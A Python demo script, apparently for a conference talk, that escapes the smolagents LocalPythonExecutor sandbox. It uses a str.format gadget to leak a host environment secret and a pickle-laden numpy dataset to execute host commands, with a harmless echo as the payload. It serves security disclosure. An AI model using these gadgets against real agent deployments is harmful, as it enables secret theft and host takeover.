#!/usr/bin/env python
"""LIVE DEMO: breaking the smolagents LocalPythonExecutor, three acts.

Run on stage:  PYTHONPATH=. python demo_rce.py

  Act 1  the sandbox blocks the obvious attacks (looks safe)
  Act 2  a one-line str.format gadget reads a host secret anyway,
         and it survives the project's in-review hardening patch (PR #2271)
  Act 3  the realistic kill: authorize ONE ordinary import (numpy) and
         loading a 'dataset' file is remote code execution

Everything runs against the REAL smolagents sandbox. The only command executed
is a benign `echo <token>` into a temp file, used to prove code execution.
"""
from __future__ import annotations

import os
import pickle
import tempfile
import time
import uuid

from harness.frameworks import SmolagentsLocalAdapter

SLOW = float(os.environ.get("DEMO_PAUSE", "0"))  # set e.g. 1.2 for stage pacing
WORK = os.path.join(tempfile.gettempdir(), "ijl_demo")
os.makedirs(WORK, exist_ok=True)


def hr(title):
    print("\n" + "=" * 72)
    print(f"  {title}")
    print("=" * 72)


def show(label, code):
    print(f"\n  >>> attacker makes the agent run ({label}):\n")
    for line in code.strip("\n").splitlines():
        print(f"      | {line}")
    time.sleep(SLOW)


def run(code, authorized=None):
    return SmolagentsLocalAdapter(authorized_imports=authorized or []).run_code(code)


def act1_blocked():
    hr("ACT 1 - the default sandbox looks safe")
    for label, code in [
        ("read an env var", "import os\nprint(os.environ['HOST_SECRET'])"),
        ("spawn a process", "import subprocess\nsubprocess.run(['whoami'])"),
        ("reach object subclasses",
         "o = type('').mro()[-1]\nprint(o.__subclasses__())"),
    ]:
        show(label, code)
        r = run(code)
        print(f"\n      [sandbox] {r.stderr.strip()[:90] or r.stdout.strip()[:90]}")
        print("      => CONTAINED")
        time.sleep(SLOW)


def act2_read(token):
    hr("ACT 2 - one format string reads the host secret (defeats PR #2271)")
    gadget = ("print('{0.gi_frame.f_globals[inspect].os.environ[HOST_SECRET]}'"
              ".format((x for x in (1,))))")
    show("str.format gadget - no dunders, no import, no call", gadget)
    r = run(gadget)
    leaked = token in (r.stdout or "")
    print(f"\n      [sandbox stdout] {r.stdout.strip()[:80]}")
    print(f"      => HOST SECRET {'LEAKED' if leaked else 'contained'}  "
          f"(dunder-free: passes the in-review patch)")
    time.sleep(SLOW)


def act3_rce(token):
    hr("ACT 3 - authorize ONE ordinary import (numpy): loading data = RCE")
    marker = os.path.join(WORK, "pwned.txt")
    if os.path.exists(marker):
        os.remove(marker)
    cmd = (f'cmd /c echo {token}> "{marker}"' if os.name == "nt"
           else f"/bin/sh -c 'echo {token} > \"{marker}\"'")

    # attacker-supplied 'dataset' - a numpy .npy carrying a pickle gadget
    import numpy as np

    class Dataset:
        def __reduce__(self):
            import os as _os
            return (_os.system, (cmd,))

    npy = os.path.join(WORK, "dataset.npy")
    np.save(npy, np.array([Dataset()], dtype=object), allow_pickle=True)
    print("\n  scenario: the agent is configured  authorized_imports=['numpy']")
    print("  so it can load arrays. An attacker supplies 'dataset.npy'.")

    code = f"import numpy\narr = numpy.load({npy.replace(os.sep, '/')!r}, allow_pickle=True)\n"
    show("the agent loads the dataset", code)
    run(code, authorized=["numpy"])

    pwned = os.path.exists(marker) and token in open(marker).read()
    print(f"\n      [host] marker file written by the sandbox? {pwned}")
    if pwned:
        print(f"      [host] contents: {open(marker).read().strip()}")
    print(f"      => {'ARBITRARY CODE EXECUTION on the host' if pwned else 'contained'}")
    time.sleep(SLOW)


def main():
    token = "DEMO-" + uuid.uuid4().hex[:12]
    os.environ["HOST_SECRET"] = token
    hr("Your AI Agent's Python Tool Is a Shell  -  smolagents LocalPythonExecutor")
    print(f"  (host secret planted for this run: {token})")
    act1_blocked()
    act2_read(token)
    act3_rce(token)
    hr("Takeaway: an AST allowlist is not a security boundary. Use OS isolation.")


if __name__ == "__main__":
    main()
